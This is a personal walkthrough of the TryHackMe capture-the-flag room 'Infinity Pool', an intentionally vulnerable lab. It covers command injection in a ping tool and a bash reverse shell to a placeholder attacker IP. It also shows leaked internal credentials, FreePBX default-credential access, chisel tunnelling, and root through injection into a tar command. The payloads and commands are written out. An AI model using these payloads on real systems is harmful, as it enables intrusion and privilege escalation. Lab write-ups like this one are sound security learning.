# Day 11 - Infinity Pool

- **Challenge:** [Infinity Pool](https://tryhackme.com/room/hh-infinitypool-5b3548af)
- **Category:** Boot2Root (web exploitation -> pivoting -> privilege escalation)
- **Difficulty:** Medium/Hard (my estimate - swap for the room's actual rating)
- **Date completed:** 6th of August 2026

## Summary

A "surveillance-luxe" hotel site called Byte Lotus. The front door is a hidden staff tool with command injection that drops you in as a low-priv user. From there it is a proper chain: two internal services leak their secrets one after another, an old FreePBX box gives up an automation key hidden in a voicemail, and that key lets you hit a root-owned worker that injects your input straight into a shell command. So: web foothold -> follow the leaked creds -> FreePBX -> automation key -> root.

## Walkthrough

### Step 1 - Recon

Opened the site, viewed source, and found `/static/app.js`. The useful bit was a developer comment pointing at a hidden staff tool:

> the staff connectivity tool at /status posts to the legacy /internal/netcheck handler. Keep it out of the public nav... Disallowed in robots.txt for now.

Everything else on the page (three dead nav links) was set dressing. Ran a full port scan:

```
nmap -p- -sV <TARGET-IP>
```

Result: `22` (OpenSSH) and `80` (gunicorn). Gunicorn means a Python/Flask app - worth remembering, because a Flask app shelling out to `ping` is prime command-injection territory.

### Step 2 - Foothold (command injection)

`/status` was a "Sister-property connectivity" tool - a box that takes a host and pings it. I tested for injection with a second command tacked on:

```
127.0.0.1; id
```

The page returned the normal ping output plus `uid=1001(web) gid=1001(web)` - confirmed RCE, output comes straight back, running as the `web` user.

Traded it for a real shell. Listener on my box:

```
nc -lvnp 4444
```

Payload in the `/status` box:

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Caught it and stabilised:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

User flag was sitting in the home directory:

```
cat /home/web/user.txt
```

Reading the app source later (`/var/www/infinity_pool/edge/app.py`) confirmed why it worked - the input went straight into `subprocess.run(f"ping -c 1 {host}", shell=True, ...)`.

### Step 3 - Internal enumeration

Looked at the app's neighbours:

```
ls -la /var/www/infinity_pool
```

Three services: `edge` (the web app, us), `watchtower` (owned by `svc-watch`), and `automation` (owned by `root`) - the last two unreadable. `ps aux` filled in the picture:

- watchtower - gunicorn on `127.0.0.1:3000`, running as `svc-watch`
- automation - gunicorn on `127.0.0.1:9000`, running as `root`

Both loopback-only, so invisible from outside - but I am inside now, so I can reach them.

### Step 4 - Watchtower leaks the creds

```
curl -s http://127.0.0.1:3000/api/config
```

This handed over a pile of stuff: FreePBX UCP creds (`FreePBXUCPTemplateCreator` + a password), the telephony portal at `127.0.0.1:8080/ucp`, and an `automation_endpoint` at `127.0.0.1:9000`. The config even flagged the UCP account as still on default template creds.

### Step 5 - Ask the automation worker what it wants

```
curl -s http://127.0.0.1:9000/health
```

It described its own API: `POST /jobs/export`, auth via `Authorization: Bearer <automation key>`, body `{"report": "<name>"}`, and it `runs_as: root`. So I need that key.

### Step 6 - FreePBX UCP (CVE-2026-46376)

`127.0.0.1:8080/ucp` was FreePBX 16.0.45. The username `FreePBXUCPTemplateCreator` is the tell for **CVE-2026-46376** - hard-coded credentials baked into the UCP generic template that let you log straight into the User Control Panel.

Logging in with raw curl kept bouncing back to the login page (the login runs through JavaScript/AJAX, which curl can't drive). So I tunnelled the internal ports out with chisel and used a real browser.

Attacker box:

```
./chisel server -p 9999 --reverse
```

Target (pulled chisel over from a python http.server on my box):

```
./chisel client <ATTACKER-IP>:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000
```

Then browsed to `http://127.0.0.1:8080/ucp/` and logged in with the leaked creds. The JS runs in a browser, so the login stuck.

### Step 7 - The key was in a voicemail

Inside UCP, added the **Voicemail** widget. The inbox had one message with the CID:

```
"Automation Key cc_auto_...." <9000>
```

There is the automation Bearer key - delivered as a voicemail, which is a nice touch for a telephony box.

### Step 8 - Root via the export job

Tested the key with a harmless report name:

```
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_...." \
  -H "Content-Type: application/json" \
  -d '{"report":"test"}'
```

The response gave the game away - it echoed the command it built:

```
tar czf /var/automation/exports/test.tgz /var/automation/data
```

My `report` value gets dropped straight into that shell command, and it runs as root. So I closed off the tar argument and appended my own command:

```
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_...." \
  -H "Content-Type: application/json" \
  -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
```

The `report` becomes `... x.tgz /var/automation/data; cat /root/root.txt #...` - tar runs, then `cat /root/root.txt` runs as root, and `#` comments out the leftover. Root flag returned.

And voila, there you have it!

## Flags

**User:** ![REDACTED](https://img.shields.io/badge/flag-REDACTED-000000)

**Root:** ![REDACTED](https://img.shields.io/badge/flag-REDACTED-000000)

The correct flags will be posted after the event has concluded, to avoid spoilers.

## Dead ends (things that did not work)

- `sudo -l` - needed the `web` password, which I never had.
- SUID scan (`find / -perm -4000`) - all standard binaries, nothing exploitable.
- Password reuse - the leaked password on `su svc-watch` and `sudo` both failed.
- Reading `/etc/freepbx.conf` for the database creds - permission denied.
- Reading `/proc/<pid>/environ` for the key - empty/denied (not my process).
- Logging into UCP with raw curl - kept re-showing the login page; the AJAX header did not fix it either. Had to tunnel and use a browser.

## Lessons Learned

- Comments in JS and app source are free recon - always read them.
- `shell=True` plus user input is command injection, every time.
- On chained boxes, leaked creds are almost never decoration - follow them.
- When a JS-heavy login fights curl, stop wrestling it and tunnel a browser in. It saves a lot of time.
- Loopback-only services stop being safe the moment you have a foothold - pivot with chisel and reach them.
- Match software versions to CVEs. FreePBX 16.0.45 pointed straight at CVE-2026-46376.
- I hate boot2roots.
